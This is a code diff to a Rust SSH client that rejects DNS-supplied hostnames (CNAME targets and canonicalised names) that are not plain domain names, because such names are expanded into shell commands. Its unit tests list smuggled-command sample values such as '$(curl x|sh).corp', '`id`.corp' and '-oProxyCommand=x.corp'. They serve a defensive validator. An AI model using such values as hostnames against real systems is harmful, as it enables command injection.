@@ -1794,6 +1794,17 @@ fn follow_cname(cfg_block: &puressh::config::ClientOptions, name: &str) -> Optio
     if cname == name {
         return None;
     }
+    // The alias comes from DNS, so from whoever answers the query. It
+    // becomes `%h` in `Match exec`, `LocalCommand` and `KnownHostsCommand`,
+    // which run through a shell or as argv: accept only a plain domain
+    // name, as OpenSSH's check_follow_cname does with valid_domain.
+    if !valid_domain(&cname) {
+        vlog(
+            1,
+            &format!("Ignoring CNAME for \"{name}\": target is not a valid domain name"),
+        );
+        return None;
+    }
     let matches = |list: &str, n: &str| {
         let patterns: Vec<puressh::config::HostPattern> = list
             .split(',')
@@ -1892,6 +1903,13 @@ fn final_config_pass(
                 return Err(format!("Could not resolve host \"{host}\""));
             }
         }
+    }
+    // Whatever canonicalisation produced is used as `%h` from here on,
+    // including in commands: it must be a domain name and nothing else.
+    if canonical && !valid_domain(&host) {
+        return Err(format!(
+            "Canonicalized hostname \"{host}\" is not a valid domain name"
+        ));
     }
     // As OpenSSH: any CanonicalizeHostname other than `no` (whether or not
     // the name changed), or a `Match final`, means a final pass, in which
@@ -5341,6 +5359,20 @@ fn valid_ruser(s: &str) -> bool {
     true
 }
 
+/// OpenSSH's valid_domain: a DNS name made of letters, digits, `-`, `_`
+/// and `.`, starting with a letter or digit, with no empty label. Used
+/// for names learned from DNS (canonicalisation, CNAMEs), which are then
+/// expanded into commands; `valid_hostname` is the looser rule for what
+/// the user typed.
+fn valid_domain(s: &str) -> bool {
+    if s.is_empty() || s.len() > 253 || s.ends_with('.') || s.contains("..") {
+        return false;
+    }
+    let mut chars = s.chars();
+    let first = chars.next().is_some_and(|c| c.is_ascii_alphanumeric());
+    first && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+}
+
 /// OpenSSH's ssh_valid_hostname: no leading `-`, whitespace, control or
 /// shell-special characters.
 fn valid_hostname(s: &str) -> bool {
@@ -8640,5 +8672,36 @@ mod forward_tests {
         assert_eq!(f.connect_path.as_deref(), Some("/tmp/l.sock"));
         assert!(parse_remote_forward("a:b:c:d:e").is_err());
         assert!(parse_remote_forward("nope").is_err());
+    }
+}
+
+#[cfg(test)]
+mod canonical_name_tests {
+    use super::valid_domain;
+
+    #[test]
+    fn valid_domain_accepts_plain_names() {
+        assert!(valid_domain("example.com"));
+        assert!(valid_domain("db-1.corp"));
+        assert!(valid_domain("host_1.internal"));
+        assert!(valid_domain("9front.org"));
+    }
+
+    #[test]
+    fn valid_domain_rejects_shell_and_option_characters() {
+        // A spoofed CNAME becomes `%h` in `Match exec` / `LocalCommand`
+        // (`$SHELL -c`) and in KnownHostsCommand's argv.
+        assert!(!valid_domain("`id`.corp"));
+        assert!(!valid_domain("$(curl x|sh).corp"));
+        assert!(!valid_domain("a;b.corp"));
+        assert!(!valid_domain("a b.corp"));
+        assert!(!valid_domain("-oProxyCommand=x.corp"));
+        assert!(!valid_domain("~root.corp"));
+        assert!(!valid_domain("a*.corp"));
+        assert!(!valid_domain(""));
+        assert!(!valid_domain("a..b"));
+        assert!(!valid_domain("a.b."));
+        assert!(!valid_domain("h\u{e9}te.corp"));
+        assert!(!valid_domain(&"a".repeat(254)));
     }
 }
